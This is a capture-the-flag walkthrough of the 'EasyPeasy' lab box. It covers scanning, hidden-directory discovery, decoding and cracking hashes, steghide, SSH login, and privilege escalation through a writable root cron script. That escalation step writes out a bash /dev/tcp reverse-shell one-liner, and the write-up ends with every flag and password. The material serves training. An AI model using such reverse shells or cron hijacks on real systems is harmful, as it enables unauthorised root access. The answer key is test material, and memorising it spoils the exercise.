# EasyPeasy

## Port Scanning
```sh
python3 /home/bc-here/CTF/pymap.py -t 10.10.57.125 --all >> ports.txt
```
- Using a Script for nmap which is pymap
- [PyMap](https://github.com/Ruhanyat-994/myCTF/blob/master/my-materials/Scripts/pymap.py)

```sh
└─$ cat ports.txt


[+] Port scanning...
80/tcp    open  http
6498/tcp  open  unknown
65524/tcp open  unknown
[+] Enumerating open ports...

PORT     STATE SERVICE VERSION
6498/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)


PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.16.1
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1


PORT      STATE SERVICE VERSION
65524/tcp open  http    Apache httpd 2.4.43 ((Ubuntu))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.43 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
```


## FeroxBuster on Server1
```sh
feroxbuster -u http://10.10.57.125/ >> ferox.txt
```
> feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories. These resources may store sensitive information about web applications and operational systems, such as source code, credentials, internal network addressing, etc…


```sh
└─$ cat ferox.txt
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

200      GET       25l       69w      612c http://10.10.57.125/

301      GET        7l       11w      169c http://10.10.57.125/hidden => http://10.10.57.125/hidden/

301      GET        7l       11w      169c http://10.10.57.125/hidden/whatever => http://10.10.57.125/hidden/whatever/

```
## Enumerating From http Server1

- I searched For robots.txt but found noting.
- Here we found a hidden directory `http://10.10.57.125/hidden/`
    - Lets have a look on the html page
    - Lets use my `comment extractor` 
- [WebCommentExtractor](https://github.com/Ruhanyat-994/myCTF/blob/master/my-materials/Scripts/web_comment_extractor.py)

- We can also use `curl` here to view the html format
- Found noting on the  `http://10.10.57.125/hidden/`
- Lets Try `http://10.10.57.125/hidden/whatever/`

```sh
curl -s http://10.10.57.125/hidden/whatever/
```
```sh
<!DOCTYPE html>
<html>
<head>
<title>dead end</title>
<style>
    body {
        background-image: url("https://cdn.pixabay.com/photo/2015/05/18/23/53/norway-772991_960_720.jpg");
        background-repeat: no-repeat;
        background-size: cover;
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<center>
<p hidden>ZmxhZ3tmMXJzN19mbDRnfQ==</p>
</center>
</body>
</html>
```
- Found a `Hash1`=`ZmxhZ3tmMXJzN19mbDRnfQ==`

## `Hash1` Cracking
```sh
└─$ echo "ZmxhZ3tmMXJzN19mbDRnfQ==" | base64 -d
flag{f1rs7_fl4g}
```
wow!

## Enumerating From http Server2
- `http://10.10.57.125:65524/` it is an apache server.
- If you read the apache documentation you will find flag3 easily,Really!
```txt
Fl4g 3 : flag{9fdafbd64c47471a8f54cd3fc64cd312} 
```
- Lets try with `robots.txt`
    - `http://10.10.57.125:65524/robots.txt` Here we found very interesting strings.
```txt
User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a18672860d0510e5ab6699730763b250
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions

```
## Cracking the hash For http Server2

- Lets try to decode `a18672860d0510e5ab6699730763b250`
[md5hasing](https://md5hashing.net/hash/md5/a18672860d0510e5ab6699730763b250)
- `flag{1m_s3c0nd_fl4g}` This is flag2

- In the apache documentation I found another Interesting hash value `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`
- After a huge Research I came to know that this is a `base62` hash
- I used cyberchef for that
- `/n0th1ng3ls3m4tt3r`  It seems to be a Directory.
- Its giving me an Image . Lets Try steghide , But steghide needs a password
```sh
└─$ curl -s http://10.10.57.125:65524/n0th1ng3ls3m4tt3r/
<html>
<head>
<title>random title</title>
<style>
        body {
        background-image: url("https://cdn.pixabay.com/photo/2018/01/26/21/20/matrix-3109795_960_720.jpg");
        background-color:black;


        }
</style>
</head>
<body>
<center>
<img src="binarycodepixabay.jpg" width="140px" height="140px"/>
<p>940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81</p>
</center>
</body>
</html>
```
- `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81` this is interesting 
- I can't research for its hash type lets use john the ripper
- Do you remember Easy Peasy provided us something to download?
- `easypeasy_1596838725703.txt` this looks like a list of something????
- There is a hint also which is 
```sh
GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)
```
- Lets use john
```sh
sudo john --wordlist=easypeasy_1596838725703.txt --format=gost hash.txt
```
```sh
mypasswordforthatjob
```

## Getting UserFlag 
```sh
┌──(bc-here㉿BC-Here)-[~/CTF/THM/EasyPeasy]
└─$ steghide extract -sf binarycodepixabay.jpg
Enter passphrase:
wrote extracted data to "secrettext.txt".

┌──(bc-here㉿BC-Here)-[~/CTF/THM/EasyPeasy]
└─$ ls
binarycodepixabay.jpg        ferox2.txt  hash.txt   secrettext.txt
easypeasy_1596838725703.txt  ferox.txt   ports.txt

┌──(bc-here㉿BC-Here)-[~/CTF/THM/EasyPeasy]
└─$ cat secrettext.txt
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001

```

- Lets decode this ! Again cyberchef!

- The password is `iconvertedmypasswordtobinary`

```sh
sudo ssh boring@10.10.57.125 -p 6498
```
```sh
boring@kral4-PC:~$ whoami
boring
boring@kral4-PC:~$ ls
user.txt
```
- We are in!
```sh
boring@kral4-PC:~$ cat user.txt
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
```
- Lets use rot13!
- flag4: flag{n0wits33msn0rm4l}

## Getting RootFlag
```sh
boring@kral4-PC:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

boring@kral4-PC:~$ l -las /var/www/
total 16
4 drwxr-xr-x  3 root   root   4096 Jun 15  2020 ./
4 drwxr-xr-x 14 root   root   4096 Jun 13  2020 ../
4 drwxr-xr-x  4 root   root   4096 Jun 15  2020 html/
4 -rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh*


```

- Lets use a bash shell as bash has the permission

```sh
bash -i >& /dev/tcp/openvpn-ip/8080 0>&1
```
- I used a shell of pentestmonkey

```sh
boring@kral4-PC:/var/www$ nano .mysecretcronjob.sh
boring@kral4-PC:/var/www$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
```
```sh
┌──(root㉿BC-Here)-[/home/bc-here/CTF/THM/EasyPeasy]
└─# rlwrap nc -nlvp 8080
listening on [any] 8080 ...
connect to [10.11.96.92] from (UNKNOWN) [10.10.57.125] 48172
bash: cannot set terminal process group (1553): Inappropriate ioctl for device
bash: no job control in this shell
root@kral4-PC:/var/www# whoami
root
```
- As I just interact the crontab it gave me the root! because crontab was connected with the script!

```sh
root@kral4-PC:~# ls -la
ls -la
total 40
drwx------  5 root root 4096 Jun 15  2020 .
drwxr-xr-x 23 root root 4096 Jun 15  2020 ..
-rw-------  1 root root    2 Sep 11 04:08 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat .root.txt
cat .root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```


## Flags
**Flag1: `flag{f1rs7_fl4g}`**  

**Flag2: `flag{1m_s3c0nd_fl4g}`**  

**Flag3: `flag{9fdafbd64c47471a8f54cd3fc64cd312}`**  

**UserFlag: `flag{n0wits33msn0rm4l}`**  

**RootFlag: `flag{63a9f0ea7bb98050796b649e85481845}`**  


## EasyPeasy Pwned!